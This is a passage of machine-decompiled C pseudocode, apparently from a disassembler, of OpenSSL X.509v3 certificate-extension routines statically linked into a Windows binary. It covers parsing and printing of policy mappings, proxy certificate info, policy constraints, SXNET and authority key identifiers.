    v7 = 0;
    if ( sub_426A30((int)a3) <= 0 )
    {
      return v5;
    }
    else
    {
      while ( 1 )
      {
        v8 = sub_426A40(a3, v7);
        v9 = v8;
        if ( !*(_DWORD *)(v8 + 8) )
          break;
        v10 = *(char **)(v8 + 4);
        if ( !v10 )
          break;
        v3 = (void **)sub_423C60(v10, 0);
        v11 = sub_423C60(*(char **)(v9 + 8), 0);
        v4 = (void **)v11;
        if ( !v3 || !v11 )
        {
          sub_408310(34, 145, 110, (int)"crypto\\x509v3\\v3_pmaps.c", 90);
          goto LABEL_15;
        }
        v12 = (void ***)sub_42FB20((int)&unk_523308);
        if ( !v12 )
        {
          sub_408310(34, 145, 65, (int)"crypto\\x509v3\\v3_pmaps.c", 96);
          goto LABEL_16;
        }
        *v12 = v3;
        v12[1] = v4;
        v4 = 0;
        v3 = 0;
        sub_4269B0(Block, (int)v12);
        if ( ++v7 >= sub_426A30((int)a3) )
          return Block;
      }
      sub_408310(34, 145, 110, (int)"crypto\\x509v3\\v3_pmaps.c", 82);
LABEL_15:
      sub_408610(6, "section:", *(_DWORD *)v9, ",name:", *(_DWORD *)(v9 + 4), ",value:", *(_DWORD *)(v9 + 8));
LABEL_16:
      sub_422B70(v3);
      sub_422B70(v4);
      sub_426C00(Block, sub_47B470);
      return 0;
    }
  }
  else
  {
    sub_408310(34, 145, 65, (int)"crypto\\x509v3\\v3_pmaps.c", 74);
    return 0;
  }
}

//----- (0047B6A0) --------------------------------------------------------
int __cdecl sub_47B6A0(int a1, int **a2, int a3, int a4)
{
  int v4; // eax
  const char *v5; // eax

  sub_419190(a3, "%*sPath Length Constraint: ", a4, byte_4F1291);
  if ( *a2 )
    sub_47A330(a3, *a2);
  else
    sub_419190(a3, "infinite");
  sub_4051D0(a3, (int)"\n");
  sub_419190(a3, "%*sPolicy Language: ", a4, byte_4F1291);
  sub_422A00(a3, *a2[1]);
  sub_4051D0(a3, (int)"\n");
  v4 = a2[1][1];
  if ( v4 )
  {
    v5 = *(const char **)(v4 + 8);
    if ( v5 )
      sub_419190(a3, "%*sPolicy Text: %s\n", a4, byte_4F1291, v5);
  }
  return 1;
}

//----- (0047B750) --------------------------------------------------------
int __usercall sub_47B750@<eax>(_DWORD *a1@<ebx>, void **a2@<esi>, char ***a3, _DWORD *a4)
{
  const char *v4; // edx
  char **v6; // eax
  void *v7; // edi
  _DWORD *v8; // eax
  int v9; // eax
  const char *v10; // ecx
  void *v11; // ebp
  void *v12; // eax
  int v13; // eax
  signed int v14; // ebp
  void *v15; // eax
  unsigned int v16; // eax
  void **v17; // ecx
  void *v18; // eax
  volatile LONG *Block; // [esp+8h] [ebp-810h]
  size_t Size; // [esp+Ch] [ebp-80Ch] BYREF
  int v21; // [esp+10h] [ebp-808h]
  char Src[2048]; // [esp+14h] [ebp-804h] BYREF

  v4 = (const char *)a1[1];
  v21 = 0;
  if ( !strcmp(v4, "language") )
  {
    if ( *a3 )
    {
      sub_408310(34, 150, 155, (int)"crypto\\x509v3\\v3_pci.c", 90);
      sub_408610(6, "section:", *a1, ",name:", a1[1], ",value:", a1[2]);
      return 0;
    }
    v6 = sub_423C60((char *)a1[2], 0);
    *a3 = v6;
    if ( !v6 )
    {
      sub_408310(34, 150, 110, (int)"crypto\\x509v3\\v3_pci.c", 96);
LABEL_7:
      sub_408610(6, "section:", *a1, ",name:", a1[1], ",value:", a1[2]);
      return 0;
    }
    return 1;
  }
  if ( strcmp(v4, "pathlen") )
  {
    if ( strcmp(v4, "policy") )
      return 1;
    v7 = 0;
    if ( !*a2 )
    {
      v8 = sub_42C430();
      *a2 = v8;
      if ( !v8 )
      {
        sub_408310(34, 150, 65, (int)"crypto\\x509v3\\v3_pci.c", 119);
        goto LABEL_7;
      }
      v21 = 1;
    }
    v9 = strncmp((const char *)a1[2], "hex:", 4u);
    v10 = (const char *)a1[2];
    if ( !v9 )
    {
      v11 = sub_424A20(v10 + 4, &Size);
      if ( !v11 )
      {
        sub_408610(6, "section:", *a1, ",name:", a1[1], ",value:", a1[2]);
        goto LABEL_43;
      }
      v12 = sub_413500(*((void **)*a2 + 2), Size + *(_DWORD *)*a2 + 1, (int)"crypto\\x509v3\\v3_pci.c", 135);
      v7 = v12;
      if ( !v12 )
      {
        sub_413490(v11);
        sub_413490(*((void **)*a2 + 2));
        *((_DWORD *)*a2 + 2) = 0;
        *(_DWORD *)*a2 = 0;
        sub_408310(34, 150, 65, (int)"crypto\\x509v3\\v3_pci.c", 151);
        sub_408610(6, "section:", *a1, ",name:", a1[1], ",value:", a1[2]);
        goto LABEL_43;
      }
      *((_DWORD *)*a2 + 2) = v12;
      memcpy((void *)(*(_DWORD *)*a2 + *((_DWORD *)*a2 + 2)), v11, Size);
      *(_DWORD *)*a2 += Size;
      *(_BYTE *)(*((_DWORD *)*a2 + 2) + *(_DWORD *)*a2) = 0;
      sub_413490(v11);
      goto LABEL_39;
    }
    if ( !strncmp(v10, "file:", 5u) )
    {
      Block = sub_4196B0((LPCCH)(a1[2] + 5), "r");
      if ( Block )
      {
        do
        {
          while ( 1 )
          {
            v13 = sub_405040((int)Block, (int)Src, 2048);
            v14 = v13;
            if ( v13 <= 0 )
              break;
            v15 = sub_413500(*((void **)*a2 + 2), *(_DWORD *)*a2 + v13 + 1, (int)"crypto\\x509v3\\v3_pci.c", 171);
            v7 = v15;
            if ( !v15 )
            {
              sub_413490(*((void **)*a2 + 2));
              *((_DWORD *)*a2 + 2) = 0;
              *(_DWORD *)*a2 = 0;
              sub_408310(34, 150, 65, (int)"crypto\\x509v3\\v3_pci.c", 178);
              sub_408610(6, "section:", *a1, ",name:", a1[1], ",value:", a1[2]);
              sub_405550(Block);
              goto LABEL_43;
            }
            *((_DWORD *)*a2 + 2) = v15;
            memcpy((void *)(*(_DWORD *)*a2 + *((_DWORD *)*a2 + 2)), Src, v14);
            *(_DWORD *)*a2 += v14;
            *(_BYTE *)(*((_DWORD *)*a2 + 2) + *(_DWORD *)*a2) = 0;
          }
        }
        while ( !v13 && sub_405020((int)Block, 8) );
        sub_405550(Block);
        if ( v14 >= 0 )
          goto LABEL_39;
        sub_408310(34, 150, 32, (int)"crypto\\x509v3\\v3_pci.c", 192);
        sub_408610(6, "section:", *a1, ",name:", a1[1], ",value:", a1[2]);
        goto LABEL_43;
      }
      sub_408310(34, 150, 32, (int)"crypto\\x509v3\\v3_pci.c", 161);
      goto LABEL_27;
    }
    if ( !strncmp((const char *)a1[2], "text:", 5u) )
    {
      v16 = a1[2] + 5 + strlen((const char *)(a1[2] + 5)) + 1;
      v17 = (void **)*a2;
      Size = v16 - (a1[2] + 6);
      v18 = sub_413500(v17[2], (size_t)*v17 + Size + 1, (int)"crypto\\x509v3\\v3_pci.c", 199);
      v7 = v18;
      if ( v18 )
      {
        *((_DWORD *)*a2 + 2) = v18;
        memcpy((void *)(*(_DWORD *)*a2 + *((_DWORD *)*a2 + 2)), (const void *)(a1[2] + 5), Size);
        *(_DWORD *)*a2 += Size;
        *(_BYTE *)(*((_DWORD *)*a2 + 2) + *(_DWORD *)*a2) = 0;
LABEL_39:
        if ( v7 )
          return 1;
        sub_408310(34, 150, 65, (int)"crypto\\x509v3\\v3_pci.c", 225);
LABEL_27:
        sub_408610(6, "section:", *a1, ",name:", a1[1], ",value:", a1[2]);
        goto LABEL_43;
      }
      sub_413490(*((void **)*a2 + 2));
      *((_DWORD *)*a2 + 2) = 0;
      *(_DWORD *)*a2 = 0;
      sub_408310(34, 150, 65, (int)"crypto\\x509v3\\v3_pci.c", 214);
      sub_408610(6, "section:", *a1, ",name:", a1[1], ",value:", a1[2]);
    }
    else
    {
      sub_408310(34, 150, 152, (int)"crypto\\x509v3\\v3_pci.c", 220);
      sub_408610(6, "section:", *a1, ",name:", a1[1], ",value:", a1[2]);
    }
LABEL_43:
    if ( v21 )
    {
      sub_42C4F0(*a2);
      *a2 = 0;
    }
    return 0;
  }
  if ( *a4 )
  {
    sub_408310(34, 150, 157, (int)"crypto\\x509v3\\v3_pci.c", 103);
    goto LABEL_7;
  }
  if ( !sub_44D5C0((int)a1, a4) )
  {
    sub_408310(34, 150, 156, (int)"crypto\\x509v3\\v3_pci.c", 109);
    goto LABEL_7;
  }
  return 1;
}

//----- (0047BDA0) --------------------------------------------------------
int __cdecl sub_47BDA0(int a1, int a2, const char *Src)
{
  int v3; // edi
  void *v4; // ebp
  _DWORD *v5; // ebx
  _BYTE *v6; // eax
  int v7; // esi
  int *v8; // edi
  int v9; // ebp
  _DWORD *v10; // eax
  void *v11; // edi
  int v12; // eax
  void *v13; // ebx
  int v14; // eax
  int v15; // esi
  void *v17; // [esp+10h] [ebp-14h] BYREF
  void *Block; // [esp+14h] [ebp-10h] BYREF
  void *v19; // [esp+18h] [ebp-Ch] BYREF
  int v20; // [esp+1Ch] [ebp-8h]
  void *v21; // [esp+20h] [ebp-4h]

  v3 = 0;
  Block = 0;
  v17 = 0;
  v19 = 0;
  v4 = sub_44D8A0(Src);
  v21 = v4;
  v20 = 0;
  if ( sub_426A30((int)v4) <= 0 )
  {
LABEL_15:
    sub_408310(34, 155, 154, (int)"crypto\\x509v3\\v3_pci.c", 287);
    goto LABEL_26;
  }
  do
  {
    v5 = (_DWORD *)sub_426A40((int *)v4, v3);
    v6 = (_BYTE *)v5[1];
    if ( !v6 )
    {
LABEL_18:
      sub_408310(34, 155, 153, (int)"crypto\\x509v3\\v3_pci.c", 254);
      goto LABEL_19;
    }
    if ( *v6 == 64 )
      goto LABEL_6;
    if ( !v5[2] )
      goto LABEL_18;
    if ( *v6 == 64 )
    {
LABEL_6:
      v7 = 1;
      v8 = (int *)sub_44DE80(a2);
      if ( v8 )
      {
        v9 = 0;
        do
        {
          if ( v9 >= sub_426A30((int)v8) )
            break;
          v10 = (_DWORD *)sub_426A40(v8, v9);
          v7 = sub_47B750(v10, &v19, (char ***)&Block, &v17);
          ++v9;
        }
        while ( v7 );
        sub_44DEC0(a2, (int)v8);
        v4 = v21;
        if ( !v7 )
          goto LABEL_26;
        v3 = v20;
        goto LABEL_13;
      }
      sub_408310(34, 155, 135, (int)"crypto\\x509v3\\v3_pci.c", 264);
LABEL_19:
      sub_408610(6, "section:", *v5, ",name:", v5[1], ",value:", v5[2]);
      goto LABEL_26;
    }
    if ( !sub_47B750(v5, &v19, (char ***)&Block, &v17) )
    {
      sub_408610(6, "section:", *v5, ",name:", v5[1], ",value:", v5[2]);
      goto LABEL_26;
    }
LABEL_13:
    v20 = ++v3;
  }
  while ( v3 < sub_426A30((int)v4) );
  v11 = Block;
  if ( !Block )
    goto LABEL_15;
  v12 = sub_423680((int)Block);
  v13 = v19;
  if ( (v12 == 667 || v12 == 665) && v19 )
  {
    sub_408310(34, 155, 159, (int)"crypto\\x509v3\\v3_pci.c", 293);
    goto LABEL_26;
  }
  v14 = sub_47F940();
  v15 = v14;
  if ( v14 )
  {
    **(_DWORD **)(v14 + 4) = v11;
    *(_DWORD *)(*(_DWORD *)(v14 + 4) + 4) = v13;
    *(_DWORD *)v14 = v17;
    v17 = 0;
  }
  else
  {
    sub_408310(34, 155, 65, (int)"crypto\\x509v3\\v3_pci.c", 299);
LABEL_26:
    sub_422B70((void **)Block);
    sub_42C4F0(v17);
    v15 = 0;
    v17 = 0;
    sub_42C4F0(v19);
    sub_47F950(0);
  }
  sub_426C00(v4, (void (__cdecl *)(_DWORD))sub_44D000);
  return v15;
}

//----- (0047C010) --------------------------------------------------------
BOOL __cdecl sub_47C010(int a1, int **a2, int a3, int a4)
{
  return (!*a2
       || sub_419190(a3, "%*scrlUrl: ", a4, byte_4F1291) > 0 && sub_47F5D0(a3, *a2) && sub_405110(a3, (int)"\n", 1) > 0)
      && (!a2[1]
       || sub_419190(a3, "%*scrlNum: ", a4, byte_4F1291) > 0
       && sub_47A330(a3, a2[1]) > 0
       && sub_405110(a3, (int)"\n", 1) > 0)
      && (!a2[2]
       || sub_419190(a3, "%*scrlTime: ", a4, byte_4F1291) > 0
       && sub_44C2C0(a3, a2[2])
       && sub_405110(a3, (int)"\n", 1) > 0);
}

//----- (0047C110) --------------------------------------------------------
BOOL __cdecl sub_47C110(int a1, int *a2, int a3, int a4)
{
  return sub_419190(a3, "%*s", a4, byte_4F1291) > 0 && sub_44C2C0(a3, a2);
}

//----- (0047C150) --------------------------------------------------------
BOOL __cdecl sub_47C150(int a1, int a2, int a3, int a4)
{
  return sub_419190(a3, "%*s", a4, byte_4F1291) > 0 && sub_422A00(a3, a2) > 0;
}

//----- (0047C1A0) --------------------------------------------------------
int __cdecl sub_47C1A0(int a1, void **a2)
{
  if ( a2 )
  {
    memcpy(*a2, *(const void **)(a1 + 8), *(_DWORD *)a1);
    *a2 = (char *)*a2 + *(_DWORD *)a1;
  }
  return *(_DWORD *)a1;
}

//----- (0047C1E0) --------------------------------------------------------
_DWORD *__cdecl sub_47C1E0(_DWORD *a1, void **a2, size_t Size)
{
  _DWORD *v3; // esi

  if ( (a1 && (v3 = (_DWORD *)*a1) != 0 || (v3 = sub_42C430()) != 0) && sub_437A10((int)v3, *a2, Size) )
  {
    *a2 = (char *)*a2 + Size;
    if ( a1 )
      *a1 = v3;
    return v3;
  }
  else
  {
    if ( !a1 || (_DWORD *)*a1 != v3 )
      sub_42C4F0(v3);
    sub_408310(39, 102, 65, (int)"crypto\\ocsp\\v3_ocsp.c", 206);
    return 0;
  }
}

//----- (0047C270) --------------------------------------------------------
BOOL __cdecl sub_47C270(int a1, int *a2, int a3, int a4)
{
  return sub_419190(a3, "%*s", a4, byte_4F1291) > 0 && sub_4D0870(a3, a2) > 0;
}

//----- (0047C2C0) --------------------------------------------------------
int __cdecl sub_47C2C0(int a1, int a2, int a3, int a4)
{
  int v4; // esi
  int *v5; // ebp

  if ( sub_419190(a3, "%*sIssuer: ", a4, byte_4F1291) > 0 && sub_445220(a3, *(int **)a2, 0, 8520479) > 0 )
  {
    v4 = 0;
    if ( sub_426A30(*(_DWORD *)(a2 + 4)) <= 0 )
      return 1;
    while ( 1 )
    {
      v5 = (int *)sub_426A40(*(int **)(a2 + 4), v4);
      if ( sub_419190(a3, "\n%*s", 2 * a4, byte_4F1291) <= 0
        || sub_422A00(a3, *v5) <= 0
        || sub_4051D0(a3, (int)" - ") <= 0
        || sub_44E1B0(a3, v5[1]) <= 0 )
      {
        break;
      }
      if ( ++v4 >= sub_426A30(*(_DWORD *)(a2 + 4)) )
        return 1;
    }
  }
  return 0;
}

//----- (0047C3A0) --------------------------------------------------------
void *sub_47C3A0()
{
  return &unk_5236CC;
}

//----- (0047C3B0) --------------------------------------------------------
int __cdecl sub_47C3B0(int a1, int *a2, int a3)
{
  sub_44D280("Require Explicit Policy", *a2, (int **)&a3);
  sub_44D280("Inhibit Policy Mapping", a2[1], (int **)&a3);
  return a3;
}

//----- (0047C3F0) --------------------------------------------------------
_DWORD *__cdecl sub_47C3F0(int a1, int a2, int *a3)
{
  _DWORD *v3; // esi
  int i; // ebx
  int v6; // edi
  int v7; // eax

  v3 = (_DWORD *)sub_42FB20((int)&unk_5236CC);
  if ( !v3 )
  {
    sub_408310(34, 146, 65, (int)"crypto\\x509v3\\v3_pcons.c", 64);
    return 0;
  }
  for ( i = 0; i < sub_426A30((int)a3); ++i )
  {
    v6 = sub_426A40(a3, i);
    if ( !strcmp(*(const char **)(v6 + 4), "requireExplicitPolicy") )
    {
      v7 = sub_44D5C0(v6, v3);
    }
    else
    {
      if ( strcmp(*(const char **)(v6 + 4), "inhibitPolicyMapping") )
      {
        sub_408310(34, 146, 106, (int)"crypto\\x509v3\\v3_pcons.c", 76);
        sub_408610(6, "section:", *(_DWORD *)v6, ",name:", *(_DWORD *)(v6 + 4), ",value:", *(_DWORD *)(v6 + 8));
LABEL_14:
        sub_42FEF0((int)v3, (int)&unk_5236CC);
        return 0;
      }
      v7 = sub_44D5C0(v6, v3 + 1);
    }
    if ( !v7 )
      goto LABEL_14;
  }
  if ( !v3[1] && !*v3 )
  {
    sub_408310(34, 146, 151, (int)"crypto\\x509v3\\v3_pcons.c", 83);
    goto LABEL_14;
  }
  return v3;
}

//----- (0047C580) --------------------------------------------------------
void *sub_47C580()
{
  return &unk_52380C;
}

//----- (0047C590) --------------------------------------------------------
void __cdecl sub_47C590(int a1)
{
  sub_42FEF0(a1, (int)&unk_52380C);
}

//----- (0047C5B0) --------------------------------------------------------
void *sub_47C5B0()
{
  return &unk_52383C;
}

//----- (0047C5C0) --------------------------------------------------------
_DWORD *__cdecl sub_47C5C0(int a1, int a2, int a3)
{
  int *v3; // esi
  int v5; // ebp
  int *v7; // esi
  int *v8; // eax
  int v9; // ebx
  size_t v10; // edi
  char *v11; // eax
  char *v12; // esi
  int *v13; // [esp+10h] [ebp-60h]
  char v14[80]; // [esp+1Ch] [ebp-54h] BYREF

  v3 = (int *)a2;
  v5 = 0;
  if ( sub_426A30(a2) > 0 )
  {
    while ( 1 )
    {
      v7 = (int *)sub_426A40(v3, v5);
      v8 = (int *)sub_44DF30(a1, v7[1], a3);
      v13 = v8;
      if ( !v8 )
        return sub_426AF0();
      v9 = sub_426A40(v8, v5);
      sub_4229E0(v14, 80, *v7);
      v10 = strlen(*(const char **)(v9 + 4)) + strlen(v14) + 5;
      v11 = (char *)sub_4133F0(v10);
      v12 = v11;
      if ( !v11 )
      {
        sub_408310(34, 138, 65, (int)"crypto\\x509v3\\v3_info.c", 81);
        return 0;
      }
      sub_424880(v11, v14, v10);
      sub_4248C0(v12, " - ", v10);
      sub_4248C0(v12, *(const char **)(v9 + 4), v10);
      sub_413490(*(void **)(v9 + 4));
      *(_DWORD *)(v9 + 4) = v12;
      ++v5;
      a3 = (int)v13;
      if ( v5 >= sub_426A30(a2) )
        break;
      v3 = (int *)a2;
    }
  }
  if ( !a3 )
    return sub_426AF0();
  return (_DWORD *)a3;
}

//----- (0047C740) --------------------------------------------------------
int *__cdecl sub_47C740(int a1, int a2, int *a3)
{
  int v4; // ebp
  int v5; // esi
  int v6; // eax
  int v7; // ebx
  char *v8; // eax
  int v9; // edi
  char *v10; // eax
  char *v11; // esi
  char **v12; // eax
  int v13; // [esp-14h] [ebp-24h]
  int *Block; // [esp+0h] [ebp-10h]
  char v15[4]; // [esp+4h] [ebp-Ch] BYREF
  char *v16; // [esp+8h] [ebp-8h]
  int v17; // [esp+Ch] [ebp-4h]

  Block = sub_426AF0();
  if ( Block )
  {
    v4 = 0;
    if ( sub_426A30((int)a3) <= 0 )
    {
      return Block;
    }
    else
    {
      while ( 1 )
      {
        v5 = sub_426A40(a3, v4);
        v6 = sub_42FB20((int)&unk_52380C);
        v7 = v6;
        if ( !v6 || !sub_4269B0(Block, v6) )
          break;
        v8 = strchr(*(const char **)(v5 + 4), 59);
        if ( !v8 )
        {
          sub_408310(34, 139, 143, (int)"crypto\\x509v3\\v3_info.c", 123);
          goto LABEL_17;
        }
        v9 = (int)&v8[-*(_DWORD *)(v5 + 4)];
        v16 = v8 + 1;
        v17 = *(_DWORD *)(v5 + 8);
        if ( !sub_44E970(*(_DWORD **)(v7 + 4), a1, a2, (int)v15, 0) )
          goto LABEL_17;
        v10 = sub_424C00(*(_BYTE **)(v5 + 4), v9);
        v11 = v10;
        if ( !v10 )
        {
          v13 = 133;
          goto LABEL_16;
        }
        v12 = sub_423C60(v10, 0);
        *(_DWORD *)v7 = v12;
        if ( !v12 )
        {
          sub_408310(34, 139, 119, (int)"crypto\\x509v3\\v3_info.c", 139);
          sub_408610(2, "value=", v11);
          sub_413490(v11);
          goto LABEL_17;
        }
        sub_413490(v11);
        if ( ++v4 >= sub_426A30((int)a3) )
          return Block;
      }
      v13 = 117;
LABEL_16:
      sub_408310(34, 139, 65, (int)"crypto\\x509v3\\v3_info.c", v13);
LABEL_17:
      sub_426C00(Block, sub_47C590);
      return 0;
    }
  }
  else
  {
    sub_408310(34, 139, 65, (int)"crypto\\x509v3\\v3_info.c", 109);
    return 0;
  }
}
// 47C740: using guessed type char var_C[4];

//----- (0047C900) --------------------------------------------------------
void *sub_47C900()
{
  return &unk_523908;
}

//----- (0047C910) --------------------------------------------------------
int __cdecl sub_47C910(int a1, int *a2, int a3)
{
  int i; // esi
  int v4; // eax
  int v6; // [esp+8h] [ebp-58h] BYREF
  char v7[80]; // [esp+Ch] [ebp-54h] BYREF

  v6 = a3;
  for ( i = 0; i < sub_426A30((int)a2); ++i )
  {
    v4 = sub_426A40(a2, i);
    sub_4229E0(v7, 80, v4);
    sub_44CF10(0, v7, (int **)&v6);
  }
  return v6;
}

//----- (0047C990) --------------------------------------------------------
int *__cdecl sub_47C990(int a1, int a2, int *a3)
{
  int *v3; // ebp
  int v5; // esi
  _DWORD *v6; // edi
  char *v7; // eax
  char **v8; // eax

  v3 = sub_426AF0();
  if ( v3 )
  {
    v5 = 0;
    if ( sub_426A30((int)a3) <= 0 )
    {
      return v3;
    }
    else
    {
      while ( 1 )
      {
        v6 = (_DWORD *)sub_426A40(a3, v5);
        v7 = (char *)v6[2];
        if ( !v7 )
          v7 = (char *)v6[1];
        v8 = sub_423C60(v7, 0);
        if ( !v8 )
          break;
        sub_4269B0(v3, (int)v8);
        if ( ++v5 >= sub_426A30((int)a3) )
          return v3;
      }
      sub_426C00(v3, (void (__cdecl *)(_DWORD))sub_422B70);
      sub_408310(34, 103, 110, (int)"crypto\\x509v3\\v3_extku.c", 93);
      sub_408610(6, "section:", *v6, ",name:", v6[1], ",value:", v6[2]);
      return 0;
    }
  }
  else
  {
    sub_408310(34, 103, 65, (int)"crypto\\x509v3\\v3_extku.c", 80);
    return 0;
  }
}

//----- (0047CA60) --------------------------------------------------------
void *sub_47CA60()
{
  return &unk_5239C4;
}

//----- (0047CA70) --------------------------------------------------------
void *sub_47CA70()
{
  return &unk_523A08;
}

//----- (0047CA80) --------------------------------------------------------
int __cdecl sub_47CA80(int a1, int a2, int a3, int a4)
{
  int v4; // eax
  int i; // esi
  int v6; // edi
  char *v7; // ebx

  v4 = sub_431860(*(unsigned int **)a2);
  sub_419190(a3, "%*sVersion: %ld (0x%lX)", a4, byte_4F1291, v4 + 1, v4);
  for ( i = 0; i < sub_426A30(*(_DWORD *)(a2 + 4)); ++i )
  {
    v6 = sub_426A40(*(int **)(a2 + 4), i);
    v7 = sub_44D0E0(0, *(_DWORD *)v6);
    sub_419190(a3, "\n%*sZone: %s, User: ", a4, byte_4F1291, v7);
    sub_413490(v7);
    sub_47F5D0(a3, *(int **)(v6 + 4));
  }
  return 1;
}

//----- (0047CB30) --------------------------------------------------------
int __cdecl sub_47CB30(int a1, _DWORD *a2)
{
  int v2; // esi
  int v3; // edi

  v2 = 0;
  if ( sub_426A30(*(_DWORD *)(a1 + 4)) <= 0 )
    return 0;
  while ( 1 )
  {
    v3 = sub_426A40(*(int **)(a1 + 4), v2);
    if ( !sub_430F50(*(unsigned int **)v3, a2) )
      break;
    if ( ++v2 >= sub_426A30(*(_DWORD *)(a1 + 4)) )
      return 0;
  }
  return *(_DWORD *)(v3 + 4);
}

//----- (0047CB90) --------------------------------------------------------
int __cdecl sub_47CB90(int *a1, _DWORD *a2, char *Src, signed int Size)
{
  _DWORD *v4; // ebx
  signed int v5; // edi
  int v7; // esi
  int *v8; // eax

  v4 = 0;
  if ( a1 && a2 && Src )
  {
    v5 = Size;
    if ( Size == -1 )
      v5 = strlen(Src);
    if ( v5 > 64 )
    {
      sub_408310(34, 126, 132, (int)"crypto\\x509v3\\v3_sxnet.c", 150);
      return 0;
    }
    v7 = *a1;
    if ( !*a1 )
    {
      v8 = (int *)sub_42FB20((int)&unk_523A08);
      v7 = (int)v8;
      if ( !v8 || !sub_431840(*v8, 0) )
      {
LABEL_19:
        sub_408310(34, 126, 65, (int)"crypto\\x509v3\\v3_sxnet.c", 179);
        sub_42FEF0((int)v4, (int)&unk_5239C4);
        sub_42FEF0(v7, (int)&unk_523A08);
        *a1 = 0;
        return 0;
      }
      *a1 = v7;
    }
    if ( sub_47CB30(v7, a2) )
    {
      sub_408310(34, 126, 133, (int)"crypto\\x509v3\\v3_sxnet.c", 162);
      return 0;
    }
    v4 = (_DWORD *)sub_42FB20((int)&unk_5239C4);
    if ( !v4 )
      goto LABEL_19;
    if ( v5 == -1 )
      v5 = strlen(Src);
    if ( !sub_437A10(v4[1], Src, v5) || !sub_4269B0(*(int **)(v7 + 4), (int)v4) )
      goto LABEL_19;
    *v4 = a2;
    return 1;
  }
  else
  {
    sub_408310(34, 126, 107, (int)"crypto\\x509v3\\v3_sxnet.c", 144);
    return 0;
  }
}

//----- (0047CD20) --------------------------------------------------------
int __cdecl sub_47CD20(int a1, int a2, int *a3)
{
  int v3; // esi
  int v4; // eax
  char *v5; // edi
  _DWORD *v6; // eax
  int v8; // [esp+Ch] [ebp-4h] BYREF

  v8 = 0;
  v3 = 0;
  if ( sub_426A30((int)a3) <= 0 )
    return v8;
  while ( 1 )
  {
    v4 = sub_426A40(a3, v3);
    v5 = *(char **)(v4 + 8);
    v6 = sub_44D140(0, *(char **)(v4 + 4));
    if ( !v6 )
      break;
    if ( !sub_47CB90(&v8, v6, v5, -1) )
      return 0;
    if ( ++v3 >= sub_426A30((int)a3) )
      return v8;
  }
  sub_408310(34, 125, 131, (int)"crypto\\x509v3\\v3_sxnet.c", 109);
  return 0;
}

//----- (0047CDB0) --------------------------------------------------------
_BYTE *__cdecl sub_47CDB0(int a1, unsigned int *a2)
{
  int v2; // eax
  int v3; // ecx

  v2 = sub_4318F0(a2);
  v3 = *(_DWORD *)(a1 + 52);
  if ( !*(_DWORD *)(v3 + 4) )
    return sub_44D080(a1, (int)a2);
  while ( v2 != *(_DWORD *)v3 )
  {
    v3 += 12;
    if ( !*(_DWORD *)(v3 + 4) )
      return sub_44D080(a1, (int)a2);
  }
  return sub_4247B0(*(const char **)(v3 + 4));
}

//----- (0047CE00) --------------------------------------------------------
_DWORD *__cdecl sub_47CE00(int a1, int a2, _DWORD *a3)
{
  char *v3; // esi
  int *v4; // eax
  int v5; // eax
  char *v6; // esi

  if ( *(_DWORD *)a2 )
  {
    v3 = sub_424B40(*(_BYTE **)(*(_DWORD *)a2 + 8), **(_DWORD **)a2);
    sub_44CF10("keyid", v3, &a3);
    sub_413490(v3);
  }
  v4 = *(int **)(a2 + 4);
  if ( v4 )
    a3 = sub_44E720(0, v4, (int)a3);
  v5 = *(_DWORD *)(a2 + 8);
  if ( v5 )
  {
    v6 = sub_424B40(*(_BYTE **)(v5 + 8), *(_DWORD *)v5);
    sub_44CF10("serial", v6, &a3);
    sub_413490(v6);
  }
  return a3;
}

//----- (0047CEA0) --------------------------------------------------------
int __cdecl sub_47CEA0(int a1, _DWORD *a2, int *a3)
{
  int v3; // ebp
  void *v4; // edi
  char v5; // bl
  int v6; // edi
  const char *v7; // eax
  const char *v8; // eax
  int v9; // esi
  int v10; // eax
  int v11; // eax
  void *v13; // eax
  int v14; // eax
  void **v15; // eax
  _DWORD *v16; // esi
  int *v17; // ebx
  int v18; // eax
  char v19; // [esp+13h] [ebp-15h]
  _DWORD *v20; // [esp+14h] [ebp-14h]
  void *v21; // [esp+18h] [ebp-10h]
  void **Block; // [esp+20h] [ebp-8h]
  void **v23; // [esp+24h] [ebp-4h]

  v3 = 0;
  v4 = 0;
  v19 = 0;
  v5 = 0;
  v21 = 0;
  Block = 0;
  v20 = 0;
  v23 = 0;
  if ( sub_426A30((int)a3) > 0 )
  {
    while ( 1 )
    {
      v6 = sub_426A40(a3, v3);
      if ( !strcmp(*(const char **)(v6 + 4), "keyid") )
      {
        v7 = *(const char **)(v6 + 8);
        v19 = 1;
        if ( v7 && !strcmp(v7, "always") )
          v19 = 2;
      }
      else
      {
        if ( strcmp(*(const char **)(v6 + 4), "issuer") )
        {
          sub_408310(34, 119, 120, (int)"crypto\\x509v3\\v3_akey.c", 94);
          sub_408610(2, "name=", *(_DWORD *)(v6 + 4));
          return 0;
        }
        v8 = *(const char **)(v6 + 8);
        v5 = 1;
        if ( v8 && !strcmp(v8, "always") )
          v5 = 2;
      }
      if ( ++v3 >= sub_426A30((int)a3) )
      {
        v4 = 0;
        break;
      }
    }
  }
  if ( !a2 )
  {
LABEL_39:
    sub_408310(34, 119, 121, (int)"crypto\\x509v3\\v3_akey.c", 104);
    return 0;
  }
  v9 = a2[1];
  if ( !v9 )
  {
    if ( *a2 == 1 )
      return sub_433340();
    goto LABEL_39;
  }
  if ( !v19 )
    goto LABEL_26;
  v10 = sub_431A40(v9, 0x52u, -1);
  if ( v10 >= 0 )
  {
    v11 = sub_431A50(v9, v10);
    if ( v11 )
      v4 = (void *)sub_44CD20(v11);
  }
  if ( v19 != 2 || v4 )
  {
LABEL_26:
    if ( (!v5 || v4) && v5 != 2
      || (v13 = (void *)sub_432E70(v9),
          v21 = sub_42CA00(v13),
          v14 = sub_432E90(v9),
          v15 = sub_4379F0(v14),
          v23 = v15,
          v21)
      && v15 )
    {
      v16 = (_DWORD *)sub_433340();
      if ( v16 )
      {
        if ( v21 )
        {
          v17 = sub_426AF0();
          Block = (void **)v17;
          if ( !v17 || (v18 = sub_4332C0(), (v20 = (_DWORD *)v18) == 0) || !sub_4269B0(v17, v18) )
          {
            sub_408310(34, 119, 65, (int)"crypto\\x509v3\\v3_akey.c", 138);
            goto LABEL_36;
          }
          *v20 = 4;
          v20[1] = v21;
        }
        *v16 = v4;
        v16[1] = Block;
        v16[2] = v23;
        return (int)v16;
      }
    }
    else
    {
      sub_408310(34, 119, 122, (int)"crypto\\x509v3\\v3_akey.c", 126);
    }
LABEL_36:
    sub_4269F0(Block);
    sub_4332D0((int)v20);
    sub_42C9E0((int)v21);
    sub_42C4F0(v23);
    sub_42C4F0(v4);
    return 0;
  }
